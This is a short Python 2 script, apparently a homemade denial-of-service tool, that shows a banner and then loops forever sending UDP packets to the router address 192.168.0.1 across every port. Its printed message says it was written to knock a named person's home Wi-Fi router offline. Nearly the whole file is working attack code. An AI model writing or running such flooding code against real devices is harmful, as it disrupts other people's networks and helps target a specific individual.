version='2.3.0'
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
line=yellow+"==========================================================================="+end
logo=red+str("""\n\n\n    8888888b.   .d88888b.   .d8888b.       Y88b   d88P
     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P
     888    888 888     888 888    888        Y88o88P
     888   d88P 888     888 888        888888  Y888P
     8888888P"  888     888 888        888888  d888b
     888 T88b   888     888 888    888        d88888b
     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b
     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b\n\n""")+end
def header():
    print(logo+cyan+'\n\n\tDEVOLOPED BY : SABBIR AHMED\n\n'+green+'\t\tVERSION : '+ str(version)+'\n\n'+end+line)

os.system('clear')
header()

print('\n\t*THIS DDOS ATTACK HAS MAKE FOR DOWN EBRAHIM RAOUTER WI-FI JUST ATTACK')
print('\tKASIPUR EBRAHIM ROUTER\n\t')

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1)
#############




ip = '192.168.0.1'
port = 1

os.system("clear")
os.system("figlet -f small Attack Starting | lolcat")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
print "[==========          ] 50%"
print "[===============     ] 75%"
print "[====================] 100%"
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print red+"Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

